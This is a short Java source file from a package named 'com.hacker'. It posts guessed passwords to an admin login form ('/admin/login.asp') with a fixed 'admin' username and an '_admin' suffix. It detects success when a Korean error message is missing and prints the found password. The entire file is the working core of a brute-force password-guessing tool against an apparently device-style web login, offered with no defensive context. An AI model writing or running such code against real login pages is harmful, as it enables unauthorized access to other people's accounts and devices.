package com.hacker;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

public class HttpRequester {
    public void requestPost(String url, String password) throws Exception {
        String errorMessage = "에러:잘못된 사용자이름 또는 암호!";
        Document d = Jsoup.connect(url)
                .data("challenge", "")
                .data("username", "admin")
                .data("password", new StringBuilder().append(password).append("_admin").toString())
                .data("cap_user", "aaa")
                .data("save", "로그인")
                .data("submit-url", "/admin/login.asp")
                .post();
        if(!errorMessage.equals(d.getElementsByTag("h4").get(0).text())){
            System.out.println("Find Password!!!!!! : " + password);
        }
    }
}
